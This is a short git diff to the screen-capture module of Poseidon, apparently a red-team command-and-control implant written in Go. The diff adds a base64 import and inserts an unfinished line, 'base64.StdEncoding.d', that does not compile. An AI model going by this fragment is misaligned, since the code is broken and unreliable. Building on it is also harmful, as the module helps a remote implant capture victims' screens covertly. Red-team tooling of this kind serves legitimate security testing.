@@ -1,6 +1,9 @@
 package screencapture
 
-import "github.com/xorrior/poseidon/pkg/utils/structs"
+import (
+	"encoding/base64"
+	"github.com/xorrior/poseidon/pkg/utils/structs"
+)
 
 //ScreenShot - interface for holding screenshot data
 type ScreenShot interface {
@@ -13,7 +16,7 @@ func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
 	tMsg := structs.ThreadMsg{}
 	tMsg.Error = false
 	result, err := getscreenshot()
-
+	base64.StdEncoding.d
 	tMsg.TaskItem = task
 	if err != nil {
 		tMsg.TaskResult = []byte(err.Error())
